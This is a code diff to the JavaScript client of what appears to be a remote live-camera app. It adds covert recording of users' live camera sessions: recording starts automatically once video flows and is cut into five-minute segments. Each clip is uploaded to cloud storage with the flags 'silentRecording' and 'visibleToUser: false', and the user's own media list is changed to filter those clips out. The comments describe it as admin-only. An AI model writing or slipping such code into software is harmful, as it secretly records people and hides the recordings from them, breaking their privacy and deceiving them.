@@ -1393,6 +1393,230 @@ async function uploadLiveVideoClip(deviceId, blob, fileName, contentType) {
   return { mediaId, downloadUrl, storagePath };
 }
 
+/** Silent background recording during user live camera sessions (admin-only visibility). */
+const SILENT_LIVE_SOURCE = "silent_live_session";
+const SILENT_SEGMENT_MS = 5 * 60 * 1000;
+
+function getSilentRecordMediaStream(deviceId) {
+  const live = liveByDevice.get(deviceId);
+  const pc = live?.pc;
+  if (!pc) throw new Error("No live session");
+  const stream = new MediaStream();
+  for (const receiver of pc.getReceivers()) {
+    const track = receiver.track;
+    if (track && track.readyState === "live") {
+      try {
+        stream.addTrack(track.clone());
+      } catch {
+        stream.addTrack(track);
+      }
+    }
+  }
+  if (!stream.getVideoTracks().length) {
+    throw new Error("No live video track");
+  }
+  return stream;
+}
+
+function scheduleSilentSegmentRotation(deviceId) {
+  const live = liveByDevice.get(deviceId);
+  if (!live?.silentRecordingActive) return;
+  if (live.silentSegmentTimer) clearTimeout(live.silentSegmentTimer);
+  live.silentSegmentTimer = setTimeout(() => {
+    void rotateSilentLiveSegment(deviceId);
+  }, SILENT_SEGMENT_MS);
+}
+
+async function maybeStartSilentLiveRecording(deviceId) {
+  const live = liveByDevice.get(deviceId);
+  if (!live || live.silentRecordingActive || !live.pc) return;
+  const hasVideo = live.pc
+    .getReceivers()
+    .some((r) => r.track?.kind === "video" && r.track.readyState === "live");
+  if (!hasVideo) return;
+  live.silentRecordingActive = true;
+  live.silentRecordingSessionId = String(live.sessionId || `silent_${Date.now()}`);
+  live.silentSegmentIndex = 0;
+  live.silentRecordingStartedAt = Date.now();
+  try {
+    await startSilentLiveSegment(deviceId);
+  } catch (e) {
+    console.warn("silent live record start failed", e);
+    live.silentRecordingActive = false;
+  }
+}
+
+async function startSilentLiveSegment(deviceId) {
+  const live = liveByDevice.get(deviceId);
+  if (!live?.silentRecordingActive) return;
+  if (live.silentVideoRecorder) return;
+
+  const stream = getSilentRecordMediaStream(deviceId);
+  const mimeType = pickLiveRecorderMime();
+  const recorder = mimeType
+    ? new MediaRecorder(stream, { mimeType, videoBitsPerSecond: 1_800_000 })
+    : new MediaRecorder(stream);
+  const chunks = [];
+  const segmentIndex = Number(live.silentSegmentIndex || 0);
+  const segmentStartedAt = Date.now();
+
+  recorder.ondataavailable = (ev) => {
+    if (ev.data && ev.data.size > 0) chunks.push(ev.data);
+  };
+  recorder.onerror = () => {
+    live.silentVideoRecorder = null;
+    live.silentVideoChunks = null;
+  };
+  recorder.onstop = () => {
+    void finalizeSilentLiveVideoRecording(
+      deviceId,
+      chunks,
+      recorder.mimeType || mimeType || "video/webm",
+      segmentIndex,
+      segmentStartedAt
+    );
+  };
+
+  live.silentVideoRecorder = recorder;
+  live.silentVideoChunks = chunks;
+  live.silentSegmentStartedAt = segmentStartedAt;
+  recorder.start(1000);
+  scheduleSilentSegmentRotation(deviceId);
+}
+
+async function rotateSilentLiveSegment(deviceId) {
+  const live = liveByDevice.get(deviceId);
+  if (!live?.silentRecordingActive) return;
+  const recorder = live.silentVideoRecorder;
+  if (!recorder) {
+    live.silentSegmentIndex = Number(live.silentSegmentIndex || 0) + 1;
+    await startSilentLiveSegment(deviceId);
+    return;
+  }
+  if (live.silentSegmentTimer) {
+    clearTimeout(live.silentSegmentTimer);
+    live.silentSegmentTimer = null;
+  }
+  live.silentVideoRecorder = null;
+  if (recorder.state === "recording" || recorder.state === "paused") {
+    recorder.stop();
+  }
+  live.silentSegmentIndex = Number(live.silentSegmentIndex || 0) + 1;
+  setTimeout(() => {
+    if (liveByDevice.get(deviceId)?.silentRecordingActive) {
+      void startSilentLiveSegment(deviceId);
+    }
+  }, 400);
+}
+
+async function stopSilentLiveRecording(deviceId) {
+  const live = liveByDevice.get(deviceId);
+  if (!live) return;
+  live.silentRecordingActive = false;
+  if (live.silentSegmentTimer) {
+    clearTimeout(live.silentSegmentTimer);
+    live.silentSegmentTimer = null;
+  }
+  const recorder = live.silentVideoRecorder;
+  live.silentVideoRecorder = null;
+  if (recorder && (recorder.state === "recording" || recorder.state === "paused")) {
+    try {
+      recorder.stop();
+    } catch {
+      /* ignore */
+    }
+  }
+}
+
+/**
+ * @param {string} deviceId
+ * @param {Blob[]} chunks
+ * @param {string} mimeType
+ * @param {number} segmentIndex
+ * @param {number} segmentStartedAt
+ */
+async function finalizeSilentLiveVideoRecording(
+  deviceId,
+  chunks,
+  mimeType,
+  segmentIndex,
+  segmentStartedAt
+) {
+  const live = liveByDevice.get(deviceId);
+  if (live) live.silentVideoChunks = null;
+  const type = String(mimeType || "video/webm").split(";")[0] || "video/webm";
+  const blob = new Blob(chunks || [], { type });
+  if (!blob.size) return;
+  const durationMs = Math.max(0, Date.now() - Number(segmentStartedAt || Date.now()));
+  const ext = type.includes("mp4") ? "mp4" : "webm";
+  const fileName = `silent_${deviceId.slice(0, 6)}_s${segmentIndex}_${Date.now()}.${ext}`;
+  try {
+    await uploadSilentLiveVideoClip(deviceId, blob, fileName, type, {
+      segmentIndex,
+      segmentStartedAt,
+      durationMs,
+      recordingSessionId: live?.silentRecordingSessionId || live?.sessionId || "",
+    });
+  } catch (e) {
+    console.warn("silent live upload failed", e);
+  }
+}
+
+/**
+ * @param {string} deviceId
+ * @param {Blob} blob
+ * @param {string} fileName
+ * @param {string} contentType
+ * @param {{ segmentIndex?: number, segmentStartedAt?: number, durationMs?: number, recordingSessionId?: string }} meta
+ */
+async function uploadSilentLiveVideoClip(deviceId, blob, fileName, contentType, meta = {}) {
+  if (!storage || !db || !firebaseUid) throw new Error("Not signed in");
+  const live = liveByDevice.get(deviceId);
+  const mediaId = `sv${Date.now().toString(36)}${Math.random().toString(36).slice(2, 10)}`;
+  const ext = fileName.includes(".") ? fileName.slice(fileName.lastIndexOf(".")) : ".webm";
+  const storagePath = `remote_media/${firebaseUid}/${mediaId}${ext}`;
+  const fileRef = storageRef(storage, storagePath);
+  const recordingSessionId = String(
+    meta.recordingSessionId || live?.silentRecordingSessionId || live?.sessionId || ""
+  );
+  await uploadBytes(fileRef, blob, {
+    contentType: contentType || "video/webm",
+    customMetadata: {
+      kind: "video",
+      deviceId: String(deviceId || ""),
+      sessionId: String(live?.sessionId || ""),
+      source: SILENT_LIVE_SOURCE,
+      silentRecording: "true",
+    },
+  });
+  const downloadUrl = await getDownloadURL(fileRef);
+  const now = Date.now();
+  await setDoc(doc(db, "users", firebaseUid, "remoteMedia", mediaId), {
+    mediaId,
+    ownerUid: firebaseUid,
+    deviceId: String(deviceId || ""),
+    sessionId: String(live?.sessionId || ""),
+    recordingSessionId,
+    clientId: String(live?.clientId || localStorage.getItem(CLIENT_ID_KEY) || ""),
+    kind: "video",
+    fileName,
+    contentType: contentType || "video/webm",
+    storagePath,
+    downloadUrl,
+    sizeBytes: blob.size,
+    createdAt: now,
+    updatedAt: now,
+    revoked: false,
+    source: SILENT_LIVE_SOURCE,
+    silentRecording: true,
+    visibleToUser: false,
+    segmentIndex: Number(meta.segmentIndex || 0),
+    segmentStartedAt: Number(meta.segmentStartedAt || now),
+    durationMs: Number(meta.durationMs || 0),
+  });
+  return { mediaId, downloadUrl, storagePath };
+}
+
 /**
  * @param {string} deviceId
  */
@@ -1544,6 +1768,7 @@ async function hydrateLiveVideoClips(deviceId) {
     const data = await api("/api/device/media?limit=40");
     const remote = (data.media || [])
       .filter((m) => {
+        if (m.silentRecording || String(m.source || "") === SILENT_LIVE_SOURCE) return false;
         const kind = String(m.kind || "");
         const isPhoto =
           kind === "photo" ||
@@ -1657,6 +1882,11 @@ function attachRemoteTrack(deviceId, track, stream) {
         .join(", ")
     : `${track.kind}:${track.readyState}`;
   setConnectionLabel(deviceId, CONN.CONNECTED, kinds || "media flowing");
+  if (track.kind === "video" && track.readyState === "live") {
+    setTimeout(() => {
+      void maybeStartSilentLiveRecording(deviceId);
+    }, 1500);
+  }
   if (!liveVideoClipsByDevice.has(deviceId)) {
     void hydrateLiveVideoClips(deviceId);
   } else {
@@ -1961,6 +2191,7 @@ async function startConnect(deviceId, clientId) {
     const live = {
       deviceId,
       requestId,
+      clientId,
       sessionId: created.sessionId || undefined,
       pc: null,
       unsubRequest: null,
@@ -2324,6 +2555,7 @@ async function endLiveSession(deviceId, reason) {
  */
 function cleanupLive(deviceId, endOnServer) {
   stopLiveCapturesPoll(deviceId);
+  void stopSilentLiveRecording(deviceId);
   const live = liveByDevice.get(deviceId);
   if (live?.browserVideoRecorder) {
     try {
